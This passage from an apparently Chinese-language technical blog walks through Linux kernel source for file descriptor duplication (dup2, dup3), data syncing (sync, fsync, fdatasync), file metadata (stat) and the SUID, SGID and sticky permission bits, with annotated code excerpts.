<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fd_install</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="comment">/* 对文件表进行保护 */</span></span><br><span class="line">    spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 得到文件表 */</span></span><br><span class="line">    fdt = files_fdtable(files);</span><br><span class="line">    BUG_ON(fdt-&gt;fd[fd] != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 让文件表中fd对应的指针等于该文件关联结构 file */</span></span><br><span class="line">    rcu_assign_pointer(fdt-&gt;fd[fd], file);</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="dup2-内核源码追踪"><a href="#dup2-内核源码追踪" class="headerlink" title="dup2 内核源码追踪"></a>dup2 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(dup2, <span class="type">unsigned</span> <span class="type">int</span>, oldfd, <span class="type">unsigned</span> <span class="type">int</span>, newfd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 如果oldfd与newfd相等，这是一种特殊的情况 */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(newfd == oldfd)) &#123; <span class="comment">/* corner case */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">        <span class="type">int</span> retval = oldfd;</span><br><span class="line">        <span class="comment">/* 检查oldfd的合法性，如果是合法的fd，则直接返回oldfd的值;如果是不合法的，则返回EBADF */</span></span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        <span class="keyword">if</span> (!fcheck_files(files, oldfd))</span><br><span class="line">            retval = -EBADF;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 如果oldfd与newfd不同，则利用sys_dup3来实现dup2 */</span></span><br><span class="line">    <span class="keyword">return</span> sys_dup3(oldfd, newfd, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="dup3-内核源码追踪"><a href="#dup3-内核源码追踪" class="headerlink" title="dup3 内核源码追踪"></a>dup3 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(dup3, <span class="type">unsigned</span> <span class="type">int</span>, oldfd, <span class="type">unsigned</span> <span class="type">int</span>, newfd, <span class="type">int</span>, flags)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err = -EBADF;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">file</span>, *<span class="title">tofree</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> * <span class="title">files</span> =</span> current-&gt;files;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fdtable</span> *<span class="title">fdt</span>;</span></span><br><span class="line">    <span class="comment">/* 对标志flags进行检查，支持O_CLOEXEC */</span></span><br><span class="line">    <span class="keyword">if</span> ((flags &amp; ~O_CLOEXEC) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="comment">/* 与dup2不同，当oldfd与newfd相同的时候，dup3返回错误 */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(oldfd == newfd))</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 根据newfd决定是否需要扩展文件表的大小 */</span></span><br><span class="line">    err = expand_files(files, newfd);</span><br><span class="line">    <span class="comment">/*检查oldfd，如果是非法的，就直接返回;不过我更倾向于先检查oldfd后扩展文件表，如果是非法的，就不需要扩展文件表了*/</span></span><br><span class="line">    file = fcheck(oldfd);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!file))</span><br><span class="line">        <span class="keyword">goto</span> Ebadf;</span><br><span class="line">    <span class="keyword">if</span> (unlikely(err &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err == -EMFILE)</span><br><span class="line">            <span class="keyword">goto</span> Ebadf;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line">    err = -EBUSY;</span><br><span class="line">    <span class="comment">/* 得到文件表 */</span></span><br><span class="line">    fdt = files_fdtable(files);</span><br><span class="line">    <span class="comment">/* 通过newfd得到对应的file结构  */</span></span><br><span class="line">    tofree = fdt-&gt;fd[newfd];</span><br><span class="line">    <span class="comment">/* tofree是NULL，但是newfd已经分配的情况 */</span></span><br><span class="line">    <span class="keyword">if</span> (!tofree &amp;&amp; FD_ISSET(newfd, fdt-&gt;open_fds))</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    <span class="comment">/* 增加file的引用计数 */</span></span><br><span class="line">    get_file(file);</span><br><span class="line">    <span class="comment">/* 将文件表newfd对应的指针指向file */</span></span><br><span class="line">    rcu_assign_pointer(fdt-&gt;fd[newfd], file);</span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    *  将newfd加到打开文件的位图中,如果newfd已经是一个合法的fd，重复设置位图则没有影响；</span></span><br><span class="line"><span class="comment">	*  如果newfd没有打开，则必须将其加入位图中。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    FD_SET(newfd, fdt-&gt;open_fds);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  如果flags设置了O_CLOEXEC，则将newfd加到close_on_exec位图；</span></span><br><span class="line"><span class="comment">	*  如果没有设置，则清除lose_on_exec位图中对应的位</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; O_CLOEXEC)</span><br><span class="line">        FD_SET(newfd, fdt-&gt;close_on_exec);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        FD_CLR(newfd, fdt-&gt;close_on_exec);</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="comment">/* 如果tofree不为空，则需要关闭newfd之前的文件 */</span></span><br><span class="line">    <span class="keyword">if</span> (tofree)</span><br><span class="line">        filp_close(tofree, files);</span><br><span class="line">    <span class="keyword">return</span> newfd;</span><br><span class="line">Ebadf:</span><br><span class="line">    err = -EBADF;</span><br><span class="line">out_unlock:</span><br><span class="line">    spin_unlock(&amp;files-&gt;file_lock);</span><br><span class="line">    <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="文件数据的同步"><a href="#文件数据的同步" class="headerlink" title="文件数据的同步"></a>文件数据的同步</h1><p>为了提高性能，操作系统会对文件的I&#x2F;O操作进行缓存处理。对于读操作，如果要读取的内容已经存在于文件缓存中，就直接读取文件缓存。对于写操作，会先将修改提交到文件缓存中，在合适的时机或者过一段时间后，操作系统才会将改动提交到磁盘上。Linux提供了三个同步接口：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sync</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fsync</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fdatasync</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br></pre></td></tr></table></figure></div>

<h2 id="sync-内核源码追踪"><a href="#sync-内核源码追踪" class="headerlink" title="sync 内核源码追踪"></a>sync 内核源码追踪</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(sync)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 唤醒后台内核线程，将“脏”缓存冲刷到磁盘上 */</span></span><br><span class="line">    wakeup_flusher_threads(<span class="number">0</span>, WB_REASON_SYNC);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  为什么要调用两次sync_filesystems呢？这是一种编程技巧，第一次sync_filesystems(0)，参数0表示不等待，</span></span><br><span class="line"><span class="comment">    *  可以迅速地将没有上锁的inode同步。第二次sync_filesystems(1)，参数1表示等待。</span></span><br><span class="line"><span class="comment">    *  对于上锁的inode会等待到解锁，再执行同步，这样可以提高性能。因为第一次操作中，</span></span><br><span class="line"><span class="comment">    *  上锁的inode很可能在第一次操作结束后，就已经解锁，这样就避免了等待</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    sync_filesystems(<span class="number">0</span>);</span><br><span class="line">    sync_filesystems(<span class="number">1</span>);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  如果是laptop模式，那么因为此处刚刚做完同步，因此可以停掉后台同步定时器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (unlikely(laptop_mode))</span><br><span class="line">        laptop_sync_completion();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>再看一下sync_filesystems-&gt;iterate_supers-&gt;sync_one_sb-&gt;__sync_filesystem，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __sync_filesystem(<span class="keyword">struct</span> super_block *sb, <span class="type">int</span> wait)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">     *  This should be safe, as we require bdi backing to actually</span></span><br><span class="line"><span class="comment">     *  write out data in the first place</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (sb-&gt;s_bdi == &amp;noop_backing_dev_info)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 磁盘配额同步 */</span></span><br><span class="line">    <span class="keyword">if</span> (sb-&gt;s_qcop &amp;&amp; sb-&gt;s_qcop-&gt;quota_sync)</span><br><span class="line">        sb-&gt;s_qcop-&gt;quota_sync(sb, <span class="number">-1</span>, wait);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    *  如果wait为true，则一直等待直到所有的脏inode写入磁盘如果wait为false，则启动脏inode回写工作，但不必等待到结束</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (wait)</span><br><span class="line">        sync_inodes_sb(sb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        writeback_inodes_sb(sb, WB_REASON_SYNC);</span><br><span class="line">    <span class="comment">/* 如果该文件系统定义了自己的同步操作，则执行该操作 */</span></span><br><span class="line">    <span class="keyword">if</span> (sb-&gt;s_op-&gt;sync_fs)</span><br><span class="line">        sb-&gt;s_op-&gt;sync_fs(sb, wait);</span><br><span class="line">    <span class="comment">/* 调用block设备的flush操作，真正地将数据写到设备上 */</span></span><br><span class="line">    <span class="keyword">return</span> __sync_blockdev(sb-&gt;s_bdev, wait);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从sync的代码实现上看，Linux的sync是阻塞调用。</p>
<h2 id="fsync-内核源码追踪"><a href="#fsync-内核源码追踪" class="headerlink" title="fsync 内核源码追踪"></a>fsync 内核源码追踪</h2><p>sync只同步fd指定的文件，并且直到同步完成才返回。sync不仅同步数据，还会同步所有被修改过的文件元数据，代码如下所示：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE1(fsync, <span class="type">unsigned</span> <span class="type">int</span>, fd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> do_fsync(fd, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_fsync</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">int</span> datasync)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="type">int</span> ret = -EBADF;</span><br><span class="line">    <span class="comment">/* 得到file管理结构 */</span></span><br><span class="line">    file = fget(fd);</span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">/* 利用vfs执行sync操作 */</span></span><br><span class="line">        ret = vfs_fsync(file, datasync);</span><br><span class="line">        fput(file);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>进入vfs_fsync-&gt;vfs_fsync_range，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vfs_fsync_range</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">loff_t</span> start, <span class="type">loff_t</span> end, <span class="type">int</span> datasync)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 调用具体操作系统的同步操作 */</span></span><br><span class="line">    <span class="keyword">if</span> (!file-&gt;f_op || !file-&gt;f_op-&gt;fsync)</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> file-&gt;f_op-&gt;fsync(file, start, end, datasync);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>真正执行同步操作的fsync是由具体的文件系统的操作函数file_operations决定的。下面选择一个常用的文件系统同步函数generic_file_fsync，代码如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">generic_file_fsync</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">loff_t</span> start, <span class="type">loff_t</span> end,</span></span><br><span class="line"><span class="params">               <span class="type">int</span> datasync)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file-&gt;f_mapping-&gt;host;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="comment">/* 同步该文件缓存中处于start到end范围内的脏页 */</span></span><br><span class="line">    err = filemap_write_and_wait_range(inode-&gt;i_mapping, start, end);</span><br><span class="line">    <span class="keyword">if</span> (err)</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">    mutex_lock(&amp;inode-&gt;i_mutex);</span><br><span class="line">    <span class="comment">/* 同步该inode对应的缓存 */</span></span><br><span class="line">    ret = sync_mapping_buffers(inode-&gt;i_mapping);</span><br><span class="line">    <span class="comment">/* inode状态没有变化，无需同步，可以直接返回 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(inode-&gt;i_state &amp; I_DIRTY))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 如果是fdatasync则仅做数据同步，并且若该inode没有影响任何数据方面操作的变化（比如文件长度），则可以直接返回 */</span></span><br><span class="line">    <span class="keyword">if</span> (datasync &amp;&amp; !(inode-&gt;i_state &amp; I_DIRTY_DATASYNC))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">/* 同步inode的元数据 */</span></span><br><span class="line">    err = sync_inode_metadata(inode, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">        ret = err;</span><br><span class="line">out:</span><br><span class="line">    mutex_unlock(&amp;inode-&gt;i_mutex);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>fdatasync的性能会优于fsync。在不需要同步所有元数据的情况下，选择fdatasync会得到更好的性能。只有在inode被设置了I_DIRTY_DATASYNC标志时，fdatasync才需要同步inode的元数据。</p>
<h1 id="文件的元数据"><a href="#文件的元数据" class="headerlink" title="文件的元数据"></a>文件的元数据</h1><p>文件的元数据包括文件的访问权限、上次访问的时间戳、所有者、所有组、文件大小等信息。Linux环境提供了三个获取文件信息的API：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">stat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> stat *buf)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">fstat</span><span class="params">(<span class="type">int</span> fd, <span class="keyword">struct</span> stat *buf)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">lstat</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> stat *buf)</span>;</span><br></pre></td></tr></table></figure></div>

<p>这三个函数都可用于得到文件的基本信息，区别在于stat得到路径path所指定的文件基本信息，fstat得到文件描述符fd指定文件的基本信息，而lstat与stat则基本相同，只有当path是一个链接文件时，lstat得到的是链接文件自己本身的基本信息而不是其指向文件的信息。所得到的文件基本信息的结果<code>struct stat</code>的结构如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">     <span class="type">dev_t</span>     st_dev;     <span class="comment">/* ID of device containing file */</span></span><br><span class="line">     <span class="type">ino_t</span>     st_ino;     <span class="comment">/* inode number */</span></span><br><span class="line">     <span class="comment">/* st_mode，其不仅仅是权限管理，同时也用于表示文件类型，比如是普通文件还是目录。 */</span></span><br><span class="line">     <span class="type">mode_t</span>    st_mode;    <span class="comment">/* protection */</span></span><br><span class="line">     <span class="type">nlink_t</span>   st_nlink;   <span class="comment">/* number of hard links */</span></span><br><span class="line">     <span class="type">uid_t</span>     st_uid;     <span class="comment">/* user ID of owner */</span></span><br><span class="line">     <span class="type">gid_t</span>     st_gid;     <span class="comment">/* group ID of owner */</span></span><br><span class="line">     <span class="type">dev_t</span>     st_rdev;    <span class="comment">/* device ID (if special file) */</span></span><br><span class="line">     <span class="type">off_t</span>     st_size;    <span class="comment">/* total size, in bytes */</span></span><br><span class="line">     <span class="type">blksize_t</span> st_blksize; <span class="comment">/* blocksize for file system I/O */</span></span><br><span class="line">     <span class="type">blkcnt_t</span>  st_blocks;  <span class="comment">/* number of 512B blocks allocated */</span></span><br><span class="line">     <span class="type">time_t</span>    st_atime;   <span class="comment">/* time of last access */</span></span><br><span class="line">     <span class="type">time_t</span>    st_mtime;   <span class="comment">/* time of last modification */</span></span><br><span class="line">     <span class="type">time_t</span>    st_ctime;   <span class="comment">/* time of last status change */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h2 id="stat-内核源码追踪"><a href="#stat-内核源码追踪" class="headerlink" title="stat 内核源码追踪"></a>stat 内核源码追踪</h2><p>具体代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE2(stat, <span class="type">const</span> <span class="type">char</span> __user *, filename,</span><br><span class="line">        <span class="keyword">struct</span> __old_kernel_stat __user *, statbuf)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kstat</span> <span class="title">stat</span>;</span></span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    <span class="comment">/* vfs_stat用于读取文件元数据至stat */</span></span><br><span class="line">    error = vfs_stat(filename, &amp;stat);</span><br><span class="line">    <span class="keyword">if</span> (error)</span><br><span class="line">        <span class="keyword">return</span> error;</span><br><span class="line">    <span class="comment">/* 这里仅是从内核的元数据结构stat复制到用户层的数据结构statbuf中 */</span></span><br><span class="line">    <span class="keyword">return</span> cp_old_stat(&amp;stat, statbuf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>进入vfs_stat-&gt;vfs_fstatat-&gt;vfs_getattr，代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vfs_getattr</span><span class="params">(<span class="keyword">struct</span> vfsmount *mnt, <span class="keyword">struct</span> dentry *dentry, <span class="keyword">struct</span> kstat *stat)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> dentry-&gt;d_inode;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line">    <span class="comment">/* 对获取inode属性操作进行安全性检查 */</span></span><br><span class="line">    retval = security_inode_getattr(mnt, dentry);</span><br><span class="line">    <span class="keyword">if</span> (retval)</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    <span class="comment">/* 如果该文件系统定义了这个inode的自定义操作函数，就执行它 */</span></span><br><span class="line">    <span class="keyword">if</span> (inode-&gt;i_op-&gt;getattr)</span><br><span class="line">        <span class="keyword">return</span> inode-&gt;i_op-&gt;getattr(mnt, dentry, stat);</span><br><span class="line">    <span class="comment">/* 如果文件系统没有定义inode的操作函数，则执行通用的函数 */</span></span><br><span class="line">    generic_fillattr(inode, stat);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">generic_fillattr</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> kstat *stat)</span></span><br><span class="line">&#123;</span><br><span class="line">    stat-&gt;dev = inode-&gt;i_sb-&gt;s_dev;</span><br><span class="line">    stat-&gt;ino = inode-&gt;i_ino;</span><br><span class="line">    stat-&gt;mode = inode-&gt;i_mode;</span><br><span class="line">    stat-&gt;nlink = inode-&gt;i_nlink;</span><br><span class="line">    stat-&gt;uid = inode-&gt;i_uid;</span><br><span class="line">    stat-&gt;gid = inode-&gt;i_gid;</span><br><span class="line">    stat-&gt;rdev = inode-&gt;i_rdev;</span><br><span class="line">    stat-&gt;size = i_size_read(inode);</span><br><span class="line">    stat-&gt;atime = inode-&gt;i_atime;</span><br><span class="line">    stat-&gt;mtime = inode-&gt;i_mtime;</span><br><span class="line">    stat-&gt;ctime = inode-&gt;i_ctime;</span><br><span class="line">    stat-&gt;blksize = (<span class="number">1</span> &lt;&lt; inode-&gt;i_blkbits);</span><br><span class="line">    stat-&gt;blocks = inode-&gt;i_blocks;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所有的文件元数据均保存在inode中，而inode是Linux也是所有类Unix文件系统中的一个概念。这样的文件系统一般将存储区域分为两类，一类是保存文件对象的元信息数据，即inode表；另一类是真正保存文件数据内容的块，所有inode完全由文件系统来维护。但是Linux也可以挂载非类Unix的文件系统，这些文件系统本身没有inode的概念，Linux为了让VFS有统一的处理流程和方法，就必须要求那些没有inode概念的文件系统，根据自己系统的特点——如何维护文件元数据，生成“虚拟的”inode以供Linux内核使用。</p>
<h2 id="权限位解析"><a href="#权限位解析" class="headerlink" title="权限位解析"></a>权限位解析</h2><p>文件常见的权限位有r、w和x，分别表示可读、可写和可执行。下面重点解析三个不常用的标志位。</p>
<h3 id="SUID-权限位"><a href="#SUID-权限位" class="headerlink" title="SUID 权限位"></a>SUID 权限位</h3><p>当文件设置SUID权限位时，就意味着无论是谁执行这个文件，都会拥有该文件所有者的权限。passwd命令正是利用这个特性，来允许普通用户修改自己的密码，因为只有root用户才有修改密码文件的权限。当普通用户执行passwd命令时，就具有了root权限，从而可以修改自己的密码。以修改文件属性的权限检查代码为例，inode_change_ok用于检查该进程是否有权限修改inode节点的属性即文件属性，示例代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">inode_change_ok</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> iattr *attr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> ia_valid = attr-&gt;ia_valid;</span><br><span class="line">    [...]</span><br><span class="line">    <span class="comment">/* Make sure a caller can chown. */</span></span><br><span class="line">    <span class="comment">/* 只有在uid和suid都不符合条件的情况下，才会返回权限不足的错误 */</span></span><br><span class="line">    <span class="keyword">if</span> ((ia_valid &amp; ATTR_UID) &amp;&amp;</span><br><span class="line">        (current_fsuid() != inode-&gt;i_uid ||</span><br><span class="line">         attr-&gt;ia_uid != inode-&gt;i_uid) &amp;&amp; !capable(CAP_CHOWN))</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="SGID-权限位"><a href="#SGID-权限位" class="headerlink" title="SGID 权限位"></a>SGID 权限位</h3><p>SGID与SUID权限位类似，当设置该权限位时，就意味着无论是谁执行该文件，都会拥有该文件所有者所在组的权限。</p>
<h3 id="Stricky-权限位"><a href="#Stricky-权限位" class="headerlink" title="Stricky 权限位"></a>Stricky 权限位</h3><p>Stricky位只有配置在目录上才有意义。当目录配置上sticky位时，其效果是即使所有的用户都拥有写权限和执行权限，该目录下的文件也只能被root或文件所有者删除。</p>
<p><strong>内核实现</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">may_delete</span><span class="params">(<span class="keyword">struct</span> inode *dir,<span class="keyword">struct</span> dentry *victim,<span class="type">int</span> isdir)</span></span><br><span class="line">&#123;</span><br><span class="line">   [...]</span><br><span class="line">   <span class="keyword">if</span> (check_sticky(dir, victim-&gt;d_inode)||</span><br><span class="line">          IS_APPEND(victim-&gt;d_inode)||</span><br><span class="line">       IS_IMMUTABLE(victim-&gt;d_inode) ||</span><br><span class="line">          IS_SWAPFILE(victim-&gt;d_inode))</span><br><span class="line">        <span class="keyword">return</span> -EPERM;</span><br><span class="line">   [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在删除文件前，内核要调用may_delete来判断该文件是否可以被删除。在这个函数中，内核通过调用check_sticky来检查文件的sticky标志位，其代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">check_sticky</span><span class="params">(<span class="keyword">struct</span> inode *dir, <span class="keyword">struct</span> inode *inode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* 得到当前文件访问权限的uid */</span></span><br><span class="line">    <span class="type">uid_t</span> fsuid = current_fsuid();</span><br><span class="line">    <span class="comment">/* 判断上级目录是否设置了sticky标志位 */</span></span><br><span class="line">    <span class="keyword">if</span> (!(dir-&gt;i_mode &amp; S_ISVTX))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 检查名称空间 */</span></span><br><span class="line">    <span class="keyword">if</span> (current_user_ns() != inode_userns(inode))</span><br><span class="line">        <span class="keyword">goto</span> other_userns;</span><br><span class="line">    <span class="comment">/* 检查当前文件的uid是否与当前用户的uid相同 */</span></span><br><span class="line">    <span class="keyword">if</span> (inode-&gt;i_uid == fsuid)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="comment">/* 检查文件所处目录的uid是否与当前用户的uid相同 */</span></span><br><span class="line">    <span class="keyword">if</span> (dir-&gt;i_uid == fsuid)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     <span class="comment">/* 该文件不属于当前用户 */</span></span><br><span class="line">other_userns:</span><br><span class="line">    <span class="keyword">return</span> !ns_capable(inode_userns(inode), CAP_FOWNER);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>当文件所处的目录设置了sticky位，即使用户(root用户除外)拥有了对应的权限，只要不是目录或文件的拥有者，就无法删除该文件。</p>
<h1 id="文件截断"><a href="#文件截断" class="headerlink" title="文件截断"></a>文件截断</h1><p>Linux提供了两个截断文件的API：</p>
